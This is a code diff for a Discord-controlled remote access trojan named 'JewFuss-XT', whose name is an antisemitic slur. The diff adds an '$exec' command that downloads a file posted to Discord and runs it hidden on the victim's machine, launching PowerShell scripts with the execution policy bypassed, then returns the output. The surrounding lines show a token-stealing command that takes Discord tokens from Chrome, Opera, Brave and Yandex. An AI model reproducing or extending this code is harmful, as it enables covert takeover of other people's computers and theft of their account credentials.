@@ -45,7 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.4.2" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.5.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -55,15 +55,22 @@ bot = commands.Bot(command_prefix='$', intents=intents)
 bot.remove_command('help')
 pyautogui.FAILSAFE = False
 
-async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "output.txt"):
+async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "output.txt", header=""):
     if len(content) > 2000:
-        if alt_content is not None:
-            buffer = io.BytesIO(alt_content.encode("utf-8"))
-        else:
-            buffer = io.BytesIO(content.encode("utf-8"))
-        await ctx.send(file=discord.File(fp=buffer, filename=filename))
+        buf = io.BytesIO((alt_content or content).encode("utf-8"))
+        await ctx.send(header, file=discord.File(fp=buf, filename=filename))
     else:
-        await ctx.send(content)
+        await ctx.send(header + content)
+
+async def fm_reply(ctx, content: str, alt_content: str = None, filename: str = "output.txt", header=""):
+    if len(content) > 2000:
+        buf = io.BytesIO((alt_content or content).encode("utf-8"))
+        await ctx.reply(header, file=discord.File(fp=buf, filename=filename))
+    else:
+        await ctx.reply(header + content)
+
+commands.Context.fm_send = fm_send
+commands.Context.fm_reply = fm_reply
         
 @bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)")
 async def update(ctx):
@@ -743,6 +750,161 @@ async def ps(ctx, *, command: str = None):
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
 
+@bot.command(name="exec", help="Runs attached file and returns console output, format $exec [timeout (optional seconds)]")
+async def exec_attachment(ctx: commands.Context, timeout: int | None = None):
+    if not ctx.message.attachments or len(ctx.message.attachments) != 1:
+        await ctx.send("Attach exactly one file.")
+        return
+
+    base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+    exec_dir = os.path.join(base_dir, "exec")
+    os.makedirs(exec_dir, exist_ok=True)
+
+    att = ctx.message.attachments[0]
+    keep = "-_.()[]{} @"
+    safe_name = "".join(c for c in att.filename if c.isalnum() or c in keep) or "uploaded.bin"
+    dest = os.path.join(exec_dir, safe_name)
+    i = 1
+    while os.path.exists(dest):
+        name, ext = os.path.splitext(safe_name)
+        dest = os.path.join(exec_dir, f"{name}_{i}{ext}")
+        i += 1
+
+    try:
+        await att.save(dest)
+    except Exception as e:
+        await ctx.send(f"Save failed: {e}")
+        return
+
+    ext = os.path.splitext(dest)[1].lower()
+    if ext == ".exe":
+        cmd = [dest]
+    elif ext in (".py", ".pyw"):
+        cmd = [sys.executable, dest]
+    elif ext == ".ps1":
+        cmd = ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", dest]
+    elif ext in (".bat", ".cmd"):
+        cmd = ["cmd", "/c", dest]
+    elif ext == ".sh":
+        cmd = ["wsl", "bash", dest]
+    else:
+        cmd = [dest]
+
+    cmd_show = subprocess.list2cmdline(cmd)
+    status = await ctx.send(
+        f"> Executing `{os.path.basename(dest)}`\n"
+        f"> * Timeout: {timeout if timeout else 'none'}s\n"
+        f"> React 🛑 to stop."
+    )
+    try:
+        await status.add_reaction("🛑")
+    except Exception:
+        pass
+
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    si.wShowWindow = 0
+
+    try:
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        si.wShowWindow = 0
+
+        proc = subprocess.Popen(
+            cmd,
+            cwd=exec_dir,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            stdin=subprocess.DEVNULL,
+            text=True,
+            bufsize=1,
+            universal_newlines=True,
+            creationflags=0x00000200 | 0x08000000,
+            startupinfo=si,
+            close_fds=True,
+        )
+
+    except FileNotFoundError:
+        try: await status.delete()
+        except Exception: pass
+        await ctx.send(f"Interpreter not found for `{ext}`.")
+        return
+    except Exception as e:
+        try: await status.delete()
+        except Exception: pass
+        await ctx.send(f"Failed to start: {e}")
+        return
+
+    output_chunks = []
+    def read_stdout():
+        try:
+            for line in proc.stdout:
+                output_chunks.append(line)
+        except Exception:
+            pass
+    t = Thread(target=read_stdout, daemon=True)
+    t.start()
+
+    loop = asyncio.get_running_loop()
+    stop_reason = None
+
+    reaction_task = asyncio.create_task(
+        ctx.bot.wait_for(
+            "reaction_add",
+            check=lambda r, u: (r.message.id == status.id and str(r.emoji) == "🛑" and not u.bot),
+        )
+    )
+    timeout_task = asyncio.create_task(asyncio.sleep(timeout)) if timeout and timeout > 0 else None
+    proc_wait_future = loop.run_in_executor(None, proc.wait)  # <-- Future, not create_task
+
+    pending = {reaction_task, proc_wait_future}
+    if timeout_task: pending.add(timeout_task)
+    done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
+
+    if reaction_task in done and not proc_wait_future.done():
+        stop_reason = "Stopped by reaction"
+        try:
+            subprocess.run(["taskkill", "/PID", str(proc.pid), "/T", "/F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+    elif timeout_task and timeout_task in done and not proc_wait_future.done():
+        stop_reason = f"Stopped by timeout ({timeout}s)"
+        try:
+            subprocess.run(["taskkill", "/PID", str(proc.pid), "/T", "/F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+
+    if not proc_wait_future.done():
+        await proc_wait_future
+    if not reaction_task.done():
+        reaction_task.cancel()
+    if timeout_task and not timeout_task.done():
+        timeout_task.cancel()
+
+    try:
+        t.join(timeout=2)
+    except Exception:
+        pass
+
+    rc = proc.returncode
+    header = f"File: `{os.path.basename(dest)}` | Exit: `{rc}` | Status: {stop_reason or 'Exited normally'}"
+    content = "".join(output_chunks) if output_chunks else "(no output)"
+
+    try:
+        await ctx.fm_reply(f"{content}", header=f"{header}\n")
+    except Exception as e:
+        await ctx.send(f"{header}\n(Output delivery error: {e})")
+
+    try:
+        await status.delete()
+    except Exception:
+        pass
+
+    try:
+        os.remove(dest)
+    except Exception as e:
+        print(f"Couldn't delete {os.path.basename(dest)}: {e}")
+
 @bot.command(name='checkperms', help="Checks if the program has access to provided file path")
 async def checkperms(ctx, file_path: str):
     permissions = check_permissions(file_path)
@@ -961,7 +1123,7 @@ async def liststartapps(ctx):
                 
     output = "\n".join(sorted(apps)) or "No valid shortcuts found."
     outputunsf = "\n".join(sorted(appsunsf)) or "No valid shortcuts found."
-    await fm_send(ctx, output, outputunsf, "startmenu.txt", )
+    await ctx.fm_send(output, outputunsf, "startmenu.txt", )
 
 @bot.command(help="Lists installed Steam games with paths.")
 async def liststeamapps(ctx):
@@ -1038,7 +1200,7 @@ async def liststeamapps(ctx):
 
     output = "\n".join(games) or "No steam games found."
     outputunsf = "\n".join(gamesunf) or "No steam games found."
-    await fm_send(ctx, output, outputunsf, "output.txt")
+    await ctx.fm_send(output, outputunsf, "output.txt")
 
 @bot.command(help="Gets discord tokens from Google Chrome, Opera (GX), Brave & Yandex")
 async def getdiscord(ctx, max_force_profiles: int = 10):
